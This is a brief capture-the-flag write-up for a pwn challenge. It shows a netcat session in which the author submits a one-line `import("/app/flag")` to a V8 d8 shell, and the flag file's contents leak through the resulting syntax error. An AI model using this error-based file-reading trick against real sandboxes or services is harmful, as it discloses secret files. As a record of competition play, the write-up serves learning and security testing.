# Nativity Scene (pwn, 312+21 pts, 8 solved)

We can use `import` function to leak content of the flag file "/app/flag" as follows:
```
$ nc 35.246.66.119 1337
Solve PoW with: hashcash -mqb28 uuqmslhq
1:28:200510:uuqmslhq::HvH8Kkm9q+NTtm1D:000000005eIoq

******IMPORTANT******
Read the description on the website.
******IMPORTANT******

Please submit your exploit and then a line containing "EOF".
Your script will be written to a file and invoked via `/app/d8 --allow-natives-syntax input.js`

import("/app/flag");
EOF
/app/flag:1: SyntaxError: Unexpected token '{'
SaF{https://www.youtube.com/watch?v=bUx9yPS4ExY}
   ^
SyntaxError: Unexpected token '{'

```

The above does not depend on any _runtime functions_ that are enabled with `--allow-natives-syntax`, so I believe it is not the intended solution.
